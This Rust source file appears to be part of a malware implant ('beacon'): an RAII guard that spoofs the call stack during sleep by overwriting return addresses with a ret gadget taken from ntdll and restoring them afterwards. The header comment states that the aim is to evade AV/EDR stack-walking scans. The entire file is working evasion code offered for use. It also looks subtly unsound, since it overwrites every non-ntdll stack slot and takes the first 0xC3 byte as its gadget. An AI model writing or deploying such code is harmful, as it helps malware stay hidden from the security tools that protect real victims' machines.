//! Stack spoofing — RAII guard that replaces return addresses on the
//! call stack with synthetic frames during the beacon sleep interval.
//!
//! Strategy: walk RSP up to 24 frames, find ntdll return gadgets, store the
//! originals, overwrite with gadgets before sleep, restore after.
//!
//! This defeats call-stack-walking AV/EDR checks that look for unusual
//! return addresses (e.g. unsigned modules or heap allocations) during scans.

pub struct SpoofGuard {
    #[cfg(target_os = "windows")]
    saved: Vec<(*mut usize, usize)>,
}

impl SpoofGuard {
    #[cfg(target_os = "windows")]
    pub fn new() -> Self {
        let saved = unsafe { spoof_install() };
        SpoofGuard { saved }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn new() -> Self { SpoofGuard {} }
}

impl Drop for SpoofGuard {
    fn drop(&mut self) {
        #[cfg(target_os = "windows")]
        unsafe { spoof_restore(&self.saved); }
    }
}

#[cfg(target_os = "windows")]
unsafe fn spoof_install() -> Vec<(*mut usize, usize)> {
    let gadget = find_ntdll_gadget();
    if gadget == 0 { return vec![]; }

    // Walk the stack up to 24 frames
    let mut saved = Vec::new();
    let mut rsp: *mut usize;
    std::arch::asm!("mov {}, rsp", out(reg) rsp);

    for _ in 0..24 {
        if rsp.is_null() { break; }
        let ra = *rsp;
        // Replace non-ntdll return addresses with our gadget
        if ra != 0 && !is_ntdll_addr(ra) {
            saved.push((rsp, ra));
            *rsp = gadget;
        }
        rsp = rsp.add(1);
    }
    saved
}

#[cfg(target_os = "windows")]
unsafe fn spoof_restore(saved: &[(*mut usize, usize)]) {
    for &(ptr, orig) in saved.iter().rev() {
        if !ptr.is_null() {
            *ptr = orig;
        }
    }
}

#[cfg(target_os = "windows")]
unsafe fn find_ntdll_gadget() -> usize {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    let ntdll_base = GetModuleHandleA(c"ntdll.dll".as_ptr() as _) as *const u8;
    if ntdll_base.is_null() { return 0; }

    // Search ntdll's .text section for a `ret` byte (0xC3)
    let (text, len) = get_ntdll_text(ntdll_base);
    if text.is_null() { return 0; }

    let slice = std::slice::from_raw_parts(text, len);
    for (i, &b) in slice.iter().enumerate() {
        if b == 0xC3 {
            return text.add(i) as usize;
        }
    }
    0
}

#[cfg(target_os = "windows")]
unsafe fn get_ntdll_text(base: *const u8) -> (*const u8, usize) {
    if *(base.add(0) as *const u16) != 0x5A4D { return (std::ptr::null(), 0); }
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);
    let num_sects = *(nt.add(6) as *const u16) as usize;
    let opt_size  = *(nt.add(0x14) as *const u16) as usize;
    let sect_base = nt.add(0x18 + opt_size);
    for i in 0..num_sects {
        let s = sect_base.add(i * 0x28);
        let name = std::slice::from_raw_parts(s, 8);
        if &name[..5] == b".text" {
            let va = *(s.add(0x0C) as *const u32) as usize;
            let sz = *(s.add(0x10) as *const u32) as usize;
            return (base.add(va), sz);
        }
    }
    (std::ptr::null(), 0)
}

#[cfg(target_os = "windows")]
unsafe fn is_ntdll_addr(addr: usize) -> bool {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    let base = GetModuleHandleA(c"ntdll.dll".as_ptr() as _) as usize;
    base != 0 && addr >= base && addr < base + 0x200000
}
